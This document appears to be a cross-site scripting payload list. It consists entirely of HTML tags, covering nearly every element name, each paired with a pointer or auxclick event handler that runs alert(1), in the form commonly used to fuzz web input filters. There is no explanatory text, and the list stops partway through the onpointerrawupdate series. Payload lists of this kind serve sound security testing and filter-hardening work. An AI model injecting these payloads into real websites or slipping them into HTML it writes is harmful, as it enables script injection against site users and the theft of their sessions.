<input onauxclick=alert(1)>
<textarea onauxclick=alert(1)>XSS</textarea>
<acronym onpointermove=alert(1)>XSS</acronym>
<address onpointermove=alert(1)>XSS</address>
<applet onpointermove=alert(1)>XSS</applet>
<area onpointermove=alert(1)>XSS</area>
<article onpointermove=alert(1)>XSS</article>
<aside onpointermove=alert(1)>XSS</aside>
<audio onpointermove=alert(1)>XSS</audio>
<b onpointermove=alert(1)>XSS</b>
<base onpointermove=alert(1)>XSS</base>
<basefont onpointermove=alert(1)>XSS</basefont>
<bdi onpointermove=alert(1)>XSS</bdi>
<bdo onpointermove=alert(1)>XSS</bdo>
<bgsound onpointermove=alert(1)>XSS</bgsound>
<big onpointermove=alert(1)>XSS</big>
<blink onpointermove=alert(1)>XSS</blink>
<blockquote onpointermove=alert(1)>XSS</blockquote>
<body onpointermove=alert(1)>XSS</body>
<br onpointermove=alert(1)>XSS</br>
<button onpointermove=alert(1)>XSS</button>
<canvas onpointermove=alert(1)>XSS</canvas>
<caption onpointermove=alert(1)>XSS</caption>
<center onpointermove=alert(1)>XSS</center>
<cite onpointermove=alert(1)>XSS</cite>
<code onpointermove=alert(1)>XSS</code>
<col onpointermove=alert(1)>XSS</col>
<colgroup onpointermove=alert(1)>XSS</colgroup>
<command onpointermove=alert(1)>XSS</command>
<content onpointermove=alert(1)>XSS</content>
<data onpointermove=alert(1)>XSS</data>
<datalist onpointermove=alert(1)>XSS</datalist>
<dd onpointermove=alert(1)>XSS</dd>
<del onpointermove=alert(1)>XSS</del>
<details onpointermove=alert(1)>XSS</details>
<dfn onpointermove=alert(1)>XSS</dfn>
<dialog onpointermove=alert(1)>XSS</dialog>
<dir onpointermove=alert(1)>XSS</dir>
<div onpointermove=alert(1)>XSS</div>
<dl onpointermove=alert(1)>XSS</dl>
<dt onpointermove=alert(1)>XSS</dt>
<element onpointermove=alert(1)>XSS</element>
<em onpointermove=alert(1)>XSS</em>
<embed onpointermove=alert(1)>XSS</embed>
<fieldset onpointermove=alert(1)>XSS</fieldset>
<figcaption onpointermove=alert(1)>XSS</figcaption>
<figure onpointermove=alert(1)>XSS</figure>
<font onpointermove=alert(1)>XSS</font>
<footer onpointermove=alert(1)>XSS</footer>
<form onpointermove=alert(1)>XSS</form>
<frame onpointermove=alert(1)>XSS</frame>
<frameset onpointermove=alert(1)>XSS</frameset>
<h1 onpointermove=alert(1)>XSS</h1>
<head onpointermove=alert(1)>XSS</head>
<header onpointermove=alert(1)>XSS</header>
<hgroup onpointermove=alert(1)>XSS</hgroup>
<hr onpointermove=alert(1)>XSS</hr>
<html onpointermove=alert(1)>XSS</html>
<i onpointermove=alert(1)>XSS</i>
<iframe onpointermove=alert(1)>XSS</iframe>
<image onpointermove=alert(1)>XSS</image>
<img onpointermove=alert(1)>XSS</img>
<input onpointermove=alert(1)>XSS</input>
<ins onpointermove=alert(1)>XSS</ins>
<isindex onpointermove=alert(1)>XSS</isindex>
<kbd onpointermove=alert(1)>XSS</kbd>
<keygen onpointermove=alert(1)>XSS</keygen>
<label onpointermove=alert(1)>XSS</label>
<legend onpointermove=alert(1)>XSS</legend>
<li onpointermove=alert(1)>XSS</li>
<link onpointermove=alert(1)>XSS</link>
<listing onpointermove=alert(1)>XSS</listing>
<main onpointermove=alert(1)>XSS</main>
<map onpointermove=alert(1)>XSS</map>
<mark onpointermove=alert(1)>XSS</mark>
<marquee onpointermove=alert(1)>XSS</marquee>
<menu onpointermove=alert(1)>XSS</menu>
<menuitem onpointermove=alert(1)>XSS</menuitem>
<meta onpointermove=alert(1)>XSS</meta>
<meter onpointermove=alert(1)>XSS</meter>
<multicol onpointermove=alert(1)>XSS</multicol>
<nav onpointermove=alert(1)>XSS</nav>
<nextid onpointermove=alert(1)>XSS</nextid>
<nobr onpointermove=alert(1)>XSS</nobr>
<noembed onpointermove=alert(1)>XSS</noembed>
<noframes onpointermove=alert(1)>XSS</noframes>
<noscript onpointermove=alert(1)>XSS</noscript>
<object onpointermove=alert(1)>XSS</object>
<ol onpointermove=alert(1)>XSS</ol>
<optgroup onpointermove=alert(1)>XSS</optgroup>
<option onpointermove=alert(1)>XSS</option>
<output onpointermove=alert(1)>XSS</output>
<p onpointermove=alert(1)>XSS</p>
<param onpointermove=alert(1)>XSS</param>
<picture onpointermove=alert(1)>XSS</picture>
<plaintext onpointermove=alert(1)>XSS</plaintext>
<pre onpointermove=alert(1)>XSS</pre>
<progress onpointermove=alert(1)>XSS</progress>
<q onpointermove=alert(1)>XSS</q>
<rb onpointermove=alert(1)>XSS</rb>
<rp onpointermove=alert(1)>XSS</rp>
<rt onpointermove=alert(1)>XSS</rt>
<rtc onpointermove=alert(1)>XSS</rtc>
<ruby onpointermove=alert(1)>XSS</ruby>
<s onpointermove=alert(1)>XSS</s>
<samp onpointermove=alert(1)>XSS</samp>
<script onpointermove=alert(1)>XSS</script>
<section onpointermove=alert(1)>XSS</section>
<select onpointermove=alert(1)>XSS</select>
<shadow onpointermove=alert(1)>XSS</shadow>
<slot onpointermove=alert(1)>XSS</slot>
<small onpointermove=alert(1)>XSS</small>
<source onpointermove=alert(1)>XSS</source>
<spacer onpointermove=alert(1)>XSS</spacer>
<span onpointermove=alert(1)>XSS</span>
<strike onpointermove=alert(1)>XSS</strike>
<strong onpointermove=alert(1)>XSS</strong>
<style onpointermove=alert(1)>XSS</style>
<sub onpointermove=alert(1)>XSS</sub>
<summary onpointermove=alert(1)>XSS</summary>
<sup onpointermove=alert(1)>XSS</sup>
<svg onpointermove=alert(1)>XSS</svg>
<table onpointermove=alert(1)>XSS</table>
<tbody onpointermove=alert(1)>XSS</tbody>
<td onpointermove=alert(1)>XSS</td>
<template onpointermove=alert(1)>XSS</template>
<textarea onpointermove=alert(1)>XSS</textarea>
<tfoot onpointermove=alert(1)>XSS</tfoot>
<th onpointermove=alert(1)>XSS</th>
<thead onpointermove=alert(1)>XSS</thead>
<time onpointermove=alert(1)>XSS</time>
<title onpointermove=alert(1)>XSS</title>
<tr onpointermove=alert(1)>XSS</tr>
<track onpointermove=alert(1)>XSS</track>
<tt onpointermove=alert(1)>XSS</tt>
<u onpointermove=alert(1)>XSS</u>
<ul onpointermove=alert(1)>XSS</ul>
<var onpointermove=alert(1)>XSS</var>
<video onpointermove=alert(1)>XSS</video>
<wbr onpointermove=alert(1)>XSS</wbr>
<xmp onpointermove=alert(1)>XSS</xmp>
<xss onpointerout=alert(1)>XSS</xss>
<a onpointerout=alert(1)>XSS</a>
<abbr onpointerout=alert(1)>XSS</abbr>
<acronym onpointerout=alert(1)>XSS</acronym>
<address onpointerout=alert(1)>XSS</address>
<applet onpointerout=alert(1)>XSS</applet>
<area onpointerout=alert(1)>XSS</area>
<article onpointerout=alert(1)>XSS</article>
<aside onpointerout=alert(1)>XSS</aside>
<audio onpointerout=alert(1)>XSS</audio>
<b onpointerout=alert(1)>XSS</b>
<base onpointerout=alert(1)>XSS</base>
<basefont onpointerout=alert(1)>XSS</basefont>
<bdi onpointerout=alert(1)>XSS</bdi>
<bdo onpointerout=alert(1)>XSS</bdo>
<bgsound onpointerout=alert(1)>XSS</bgsound>
<big onpointerout=alert(1)>XSS</big>
<blink onpointerout=alert(1)>XSS</blink>
<blockquote onpointerout=alert(1)>XSS</blockquote>
<body onpointerout=alert(1)>XSS</body>
<br onpointerout=alert(1)>XSS</br>
<button onpointerout=alert(1)>XSS</button>
<canvas onpointerout=alert(1)>XSS</canvas>
<caption onpointerout=alert(1)>XSS</caption>
<center onpointerout=alert(1)>XSS</center>
<cite onpointerout=alert(1)>XSS</cite>
<code onpointerout=alert(1)>XSS</code>
<col onpointerout=alert(1)>XSS</col>
<colgroup onpointerout=alert(1)>XSS</colgroup>
<command onpointerout=alert(1)>XSS</command>
<content onpointerout=alert(1)>XSS</content>
<data onpointerout=alert(1)>XSS</data>
<datalist onpointerout=alert(1)>XSS</datalist>
<dd onpointerout=alert(1)>XSS</dd>
<del onpointerout=alert(1)>XSS</del>
<details onpointerout=alert(1)>XSS</details>
<dfn onpointerout=alert(1)>XSS</dfn>
<dialog onpointerout=alert(1)>XSS</dialog>
<dir onpointerout=alert(1)>XSS</dir>
<div onpointerout=alert(1)>XSS</div>
<dl onpointerout=alert(1)>XSS</dl>
<dt onpointerout=alert(1)>XSS</dt>
<element onpointerout=alert(1)>XSS</element>
<em onpointerout=alert(1)>XSS</em>
<embed onpointerout=alert(1)>XSS</embed>
<fieldset onpointerout=alert(1)>XSS</fieldset>
<figcaption onpointerout=alert(1)>XSS</figcaption>
<figure onpointerout=alert(1)>XSS</figure>
<font onpointerout=alert(1)>XSS</font>
<footer onpointerout=alert(1)>XSS</footer>
<form onpointerout=alert(1)>XSS</form>
<frame onpointerout=alert(1)>XSS</frame>
<frameset onpointerout=alert(1)>XSS</frameset>
<h1 onpointerout=alert(1)>XSS</h1>
<head onpointerout=alert(1)>XSS</head>
<header onpointerout=alert(1)>XSS</header>
<hgroup onpointerout=alert(1)>XSS</hgroup>
<hr onpointerout=alert(1)>XSS</hr>
<html onpointerout=alert(1)>XSS</html>
<i onpointerout=alert(1)>XSS</i>
<iframe onpointerout=alert(1)>XSS</iframe>
<image onpointerout=alert(1)>XSS</image>
<img onpointerout=alert(1)>XSS</img>
<input onpointerout=alert(1)>XSS</input>
<ins onpointerout=alert(1)>XSS</ins>
<isindex onpointerout=alert(1)>XSS</isindex>
<kbd onpointerout=alert(1)>XSS</kbd>
<keygen onpointerout=alert(1)>XSS</keygen>
<label onpointerout=alert(1)>XSS</label>
<legend onpointerout=alert(1)>XSS</legend>
<li onpointerout=alert(1)>XSS</li>
<link onpointerout=alert(1)>XSS</link>
<listing onpointerout=alert(1)>XSS</listing>
<main onpointerout=alert(1)>XSS</main>
<map onpointerout=alert(1)>XSS</map>
<mark onpointerout=alert(1)>XSS</mark>
<marquee onpointerout=alert(1)>XSS</marquee>
<menu onpointerout=alert(1)>XSS</menu>
<menuitem onpointerout=alert(1)>XSS</menuitem>
<meta onpointerout=alert(1)>XSS</meta>
<meter onpointerout=alert(1)>XSS</meter>
<multicol onpointerout=alert(1)>XSS</multicol>
<nav onpointerout=alert(1)>XSS</nav>
<nextid onpointerout=alert(1)>XSS</nextid>
<nobr onpointerout=alert(1)>XSS</nobr>
<noembed onpointerout=alert(1)>XSS</noembed>
<noframes onpointerout=alert(1)>XSS</noframes>
<noscript onpointerout=alert(1)>XSS</noscript>
<object onpointerout=alert(1)>XSS</object>
<ol onpointerout=alert(1)>XSS</ol>
<optgroup onpointerout=alert(1)>XSS</optgroup>
<option onpointerout=alert(1)>XSS</option>
<output onpointerout=alert(1)>XSS</output>
<p onpointerout=alert(1)>XSS</p>
<param onpointerout=alert(1)>XSS</param>
<picture onpointerout=alert(1)>XSS</picture>
<plaintext onpointerout=alert(1)>XSS</plaintext>
<pre onpointerout=alert(1)>XSS</pre>
<progress onpointerout=alert(1)>XSS</progress>
<q onpointerout=alert(1)>XSS</q>
<rb onpointerout=alert(1)>XSS</rb>
<rp onpointerout=alert(1)>XSS</rp>
<rt onpointerout=alert(1)>XSS</rt>
<rtc onpointerout=alert(1)>XSS</rtc>
<ruby onpointerout=alert(1)>XSS</ruby>
<s onpointerout=alert(1)>XSS</s>
<samp onpointerout=alert(1)>XSS</samp>
<script onpointerout=alert(1)>XSS</script>
<section onpointerout=alert(1)>XSS</section>
<select onpointerout=alert(1)>XSS</select>
<shadow onpointerout=alert(1)>XSS</shadow>
<slot onpointerout=alert(1)>XSS</slot>
<small onpointerout=alert(1)>XSS</small>
<source onpointerout=alert(1)>XSS</source>
<spacer onpointerout=alert(1)>XSS</spacer>
<span onpointerout=alert(1)>XSS</span>
<strike onpointerout=alert(1)>XSS</strike>
<strong onpointerout=alert(1)>XSS</strong>
<style onpointerout=alert(1)>XSS</style>
<sub onpointerout=alert(1)>XSS</sub>
<summary onpointerout=alert(1)>XSS</summary>
<sup onpointerout=alert(1)>XSS</sup>
<svg onpointerout=alert(1)>XSS</svg>
<table onpointerout=alert(1)>XSS</table>
<tbody onpointerout=alert(1)>XSS</tbody>
<td onpointerout=alert(1)>XSS</td>
<template onpointerout=alert(1)>XSS</template>
<textarea onpointerout=alert(1)>XSS</textarea>
<tfoot onpointerout=alert(1)>XSS</tfoot>
<th onpointerout=alert(1)>XSS</th>
<thead onpointerout=alert(1)>XSS</thead>
<time onpointerout=alert(1)>XSS</time>
<title onpointerout=alert(1)>XSS</title>
<tr onpointerout=alert(1)>XSS</tr>
<track onpointerout=alert(1)>XSS</track>
<tt onpointerout=alert(1)>XSS</tt>
<u onpointerout=alert(1)>XSS</u>
<ul onpointerout=alert(1)>XSS</ul>
<var onpointerout=alert(1)>XSS</var>
<video onpointerout=alert(1)>XSS</video>
<wbr onpointerout=alert(1)>XSS</wbr>
<xmp onpointerout=alert(1)>XSS</xmp>
<xss onpointerover=alert(1)>XSS</xss>
<a onpointerover=alert(1)>XSS</a>
<abbr onpointerover=alert(1)>XSS</abbr>
<acronym onpointerover=alert(1)>XSS</acronym>
<address onpointerover=alert(1)>XSS</address>
<applet onpointerover=alert(1)>XSS</applet>
<area onpointerover=alert(1)>XSS</area>
<article onpointerover=alert(1)>XSS</article>
<aside onpointerover=alert(1)>XSS</aside>
<audio onpointerover=alert(1)>XSS</audio>
<b onpointerover=alert(1)>XSS</b>
<base onpointerover=alert(1)>XSS</base>
<basefont onpointerover=alert(1)>XSS</basefont>
<bdi onpointerover=alert(1)>XSS</bdi>
<bdo onpointerover=alert(1)>XSS</bdo>
<bgsound onpointerover=alert(1)>XSS</bgsound>
<big onpointerover=alert(1)>XSS</big>
<blink onpointerover=alert(1)>XSS</blink>
<blockquote onpointerover=alert(1)>XSS</blockquote>
<body onpointerover=alert(1)>XSS</body>
<br onpointerover=alert(1)>XSS</br>
<button onpointerover=alert(1)>XSS</button>
<canvas onpointerover=alert(1)>XSS</canvas>
<caption onpointerover=alert(1)>XSS</caption>
<center onpointerover=alert(1)>XSS</center>
<cite onpointerover=alert(1)>XSS</cite>
<code onpointerover=alert(1)>XSS</code>
<col onpointerover=alert(1)>XSS</col>
<colgroup onpointerover=alert(1)>XSS</colgroup>
<command onpointerover=alert(1)>XSS</command>
<content onpointerover=alert(1)>XSS</content>
<data onpointerover=alert(1)>XSS</data>
<datalist onpointerover=alert(1)>XSS</datalist>
<dd onpointerover=alert(1)>XSS</dd>
<del onpointerover=alert(1)>XSS</del>
<details onpointerover=alert(1)>XSS</details>
<dfn onpointerover=alert(1)>XSS</dfn>
<dialog onpointerover=alert(1)>XSS</dialog>
<dir onpointerover=alert(1)>XSS</dir>
<div onpointerover=alert(1)>XSS</div>
<dl onpointerover=alert(1)>XSS</dl>
<dt onpointerover=alert(1)>XSS</dt>
<element onpointerover=alert(1)>XSS</element>
<em onpointerover=alert(1)>XSS</em>
<embed onpointerover=alert(1)>XSS</embed>
<fieldset onpointerover=alert(1)>XSS</fieldset>
<figcaption onpointerover=alert(1)>XSS</figcaption>
<figure onpointerover=alert(1)>XSS</figure>
<font onpointerover=alert(1)>XSS</font>
<footer onpointerover=alert(1)>XSS</footer>
<form onpointerover=alert(1)>XSS</form>
<frame onpointerover=alert(1)>XSS</frame>
<frameset onpointerover=alert(1)>XSS</frameset>
<h1 onpointerover=alert(1)>XSS</h1>
<head onpointerover=alert(1)>XSS</head>
<header onpointerover=alert(1)>XSS</header>
<hgroup onpointerover=alert(1)>XSS</hgroup>
<hr onpointerover=alert(1)>XSS</hr>
<html onpointerover=alert(1)>XSS</html>
<i onpointerover=alert(1)>XSS</i>
<iframe onpointerover=alert(1)>XSS</iframe>
<image onpointerover=alert(1)>XSS</image>
<img onpointerover=alert(1)>XSS</img>
<input onpointerover=alert(1)>XSS</input>
<ins onpointerover=alert(1)>XSS</ins>
<isindex onpointerover=alert(1)>XSS</isindex>
<kbd onpointerover=alert(1)>XSS</kbd>
<keygen onpointerover=alert(1)>XSS</keygen>
<label onpointerover=alert(1)>XSS</label>
<legend onpointerover=alert(1)>XSS</legend>
<li onpointerover=alert(1)>XSS</li>
<link onpointerover=alert(1)>XSS</link>
<listing onpointerover=alert(1)>XSS</listing>
<main onpointerover=alert(1)>XSS</main>
<map onpointerover=alert(1)>XSS</map>
<mark onpointerover=alert(1)>XSS</mark>
<marquee onpointerover=alert(1)>XSS</marquee>
<menu onpointerover=alert(1)>XSS</menu>
<menuitem onpointerover=alert(1)>XSS</menuitem>
<meta onpointerover=alert(1)>XSS</meta>
<meter onpointerover=alert(1)>XSS</meter>
<multicol onpointerover=alert(1)>XSS</multicol>
<nav onpointerover=alert(1)>XSS</nav>
<nextid onpointerover=alert(1)>XSS</nextid>
<nobr onpointerover=alert(1)>XSS</nobr>
<noembed onpointerover=alert(1)>XSS</noembed>
<noframes onpointerover=alert(1)>XSS</noframes>
<noscript onpointerover=alert(1)>XSS</noscript>
<object onpointerover=alert(1)>XSS</object>
<ol onpointerover=alert(1)>XSS</ol>
<optgroup onpointerover=alert(1)>XSS</optgroup>
<option onpointerover=alert(1)>XSS</option>
<output onpointerover=alert(1)>XSS</output>
<p onpointerover=alert(1)>XSS</p>
<param onpointerover=alert(1)>XSS</param>
<picture onpointerover=alert(1)>XSS</picture>
<plaintext onpointerover=alert(1)>XSS</plaintext>
<pre onpointerover=alert(1)>XSS</pre>
<progress onpointerover=alert(1)>XSS</progress>
<q onpointerover=alert(1)>XSS</q>
<rb onpointerover=alert(1)>XSS</rb>
<rp onpointerover=alert(1)>XSS</rp>
<rt onpointerover=alert(1)>XSS</rt>
<rtc onpointerover=alert(1)>XSS</rtc>
<ruby onpointerover=alert(1)>XSS</ruby>
<s onpointerover=alert(1)>XSS</s>
<samp onpointerover=alert(1)>XSS</samp>
<script onpointerover=alert(1)>XSS</script>
<section onpointerover=alert(1)>XSS</section>
<select onpointerover=alert(1)>XSS</select>
<shadow onpointerover=alert(1)>XSS</shadow>
<slot onpointerover=alert(1)>XSS</slot>
<small onpointerover=alert(1)>XSS</small>
<source onpointerover=alert(1)>XSS</source>
<spacer onpointerover=alert(1)>XSS</spacer>
<span onpointerover=alert(1)>XSS</span>
<strike onpointerover=alert(1)>XSS</strike>
<strong onpointerover=alert(1)>XSS</strong>
<style onpointerover=alert(1)>XSS</style>
<sub onpointerover=alert(1)>XSS</sub>
<summary onpointerover=alert(1)>XSS</summary>
<sup onpointerover=alert(1)>XSS</sup>
<svg onpointerover=alert(1)>XSS</svg>
<table onpointerover=alert(1)>XSS</table>
<tbody onpointerover=alert(1)>XSS</tbody>
<td onpointerover=alert(1)>XSS</td>
<template onpointerover=alert(1)>XSS</template>
<textarea onpointerover=alert(1)>XSS</textarea>
<tfoot onpointerover=alert(1)>XSS</tfoot>
<th onpointerover=alert(1)>XSS</th>
<thead onpointerover=alert(1)>XSS</thead>
<time onpointerover=alert(1)>XSS</time>
<title onpointerover=alert(1)>XSS</title>
<tr onpointerover=alert(1)>XSS</tr>
<track onpointerover=alert(1)>XSS</track>
<tt onpointerover=alert(1)>XSS</tt>
<u onpointerover=alert(1)>XSS</u>
<ul onpointerover=alert(1)>XSS</ul>
<var onpointerover=alert(1)>XSS</var>
<video onpointerover=alert(1)>XSS</video>
<wbr onpointerover=alert(1)>XSS</wbr>
<xmp onpointerover=alert(1)>XSS</xmp>
<xss onpointerrawupdate=alert(1)>XSS</xss>
<a onpointerrawupdate=alert(1)>XSS</a>
<abbr onpointerrawupdate=alert(1)>XSS</abbr>
<acronym onpointerrawupdate=alert(1)>XSS</acronym>
<address onpointerrawupdate=alert(1)>XSS</address>
<applet onpointerrawupdate=alert(1)>XSS</applet>
<area onpointerrawupdate=alert(1)>XSS</area>
<article onpointerrawupdate=alert(1)>XSS</article>
<aside onpointerrawupdate=alert(1)>XSS</aside>
<audio onpointerrawupdate=alert(1)>XSS</audio>
<b onpointerrawupdate=alert(1)>XSS</b>
<base onpointerrawupdate=alert(1)>XSS</base>
<basefont onpointerrawupdate=alert(1)>XSS</basefont>
<bdi onpointerrawupdate=alert(1)>XSS</bdi>
<bdo onpointerrawupdate=alert(1)>XSS</bdo>
<bgsound onpointerrawupdate=alert(1)>XSS</bgsound>
<big onpointerrawupdate=alert(1)>XSS</big>
<blink onpointerrawupdate=alert(1)>XSS</blink>
<blockquote onpointerrawupdate=alert(1)>XSS</blockquote>
<body onpointerrawupdate=alert(1)>XSS</body>
<br onpointerrawupdate=alert(1)>XSS</br>
<button onpointerrawupdate=alert(1)>XSS</button>
<canvas onpointerrawupdate=alert(1)>XSS</canvas>
<caption onpointerrawupdate=alert(1)>XSS</caption>
<center onpointerrawupdate=alert(1)>XSS</center>
<cite onpointerrawupdate=alert(1)>XSS</cite>
<code onpointerrawupdate=alert(1)>XSS</code>
<col onpointerrawupdate=alert(1)>XSS</col>
<colgroup onpointerrawupdate=alert(1)>XSS</colgroup>
<command onpointerrawupdate=alert(1)>XSS</command>
<content onpointerrawupdate=alert(1)>XSS</content>
<data onpointerrawupdate=alert(1)>XSS</data>
<datalist onpointerrawupdate=alert(1)>XSS</datalist>
<dd onpointerrawupdate=alert(1)>XSS</dd>
<del onpointerrawupdate=alert(1)>XSS</del>
<details onpointerrawupdate=alert(1)>XSS</details>
<dfn onpointerrawupdate=alert(1)>XSS</dfn>
